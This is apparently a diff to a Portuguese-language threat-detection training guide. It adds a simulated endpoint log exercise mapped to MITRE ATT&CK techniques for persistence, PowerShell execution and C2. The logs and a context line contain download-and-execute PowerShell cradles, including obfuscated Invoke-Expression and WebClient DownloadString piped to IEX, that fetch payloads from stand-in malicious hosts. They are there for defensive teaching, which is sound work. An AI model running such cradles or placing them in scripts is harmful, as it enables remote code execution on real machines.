@@ -147,12 +147,53 @@ $a = 'Invoke-'; $b = 'WebRequest'; $c = '("http://malicious[.]site/payload.ps1")
 Invoke-Expression ($a + $b + $c)
 ```
 
+## 03.4. Atividade Prática
+Cenário Simulado: Logs de um endpoint mostram execução de PowerShell e criação de tarefas agendadas.
+```
+[2026-04-08 08:14:22] EventID: 4698 
+SubjectUserName: SYSTEM 
+TaskName: \Microsoft\Windows\Update\ScheduledUpdate 
+ActionType: Execute 
+Command: powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\update.ps1" 
+```
+```
+[2026-04-08 08:14:23] EventID: 4104 
+ScriptBlockText: $client = New-Object System.Net.WebClient; $client.DownloadString("http://malicious-domain.com/payload.ps1") | IEX
+```
+```
+[2026-04-08 08:14:24] EventID: 4688 
+NewProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentProcessName: svchost.exe 
+CommandLine: powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\update.ps1"
+```
+```
+[2026-04-08 08:14:25] EventID: 5156 
+Application: powershell.exe 
+DestinationIP: 185.203.119.45 
+DestinationPort: 443 
+Protocol: TCP 
+```
+```
+[2026-04-08 08:14:26] EventID: 4663 
+ObjectName: C:\Users\Public\update.ps1 
+AccessMask: 0x2 (WriteData) 
+AccessType: Write 
+SubjectUserName: SYSTEM
+```
+### Resultado
+- Persistência: 
+Criação de tarefa agendada (EventID: 4698) com execução de script PowerShell → Técnica T1053.005 
 
+- Execução: 
+Uso de PowerShell com ExecutionPolicy e Invoke-Expression(IEX) → Técnica 1059.001 
 
+- C2: 
+Comunicação com IP externo via PowerShell → Técnica T1071.001 
 
+- Artefato: 
+Script update.ps1 modificado e executado
 
-
-
+## 05. Simulação de Ataque APT
 
 
 
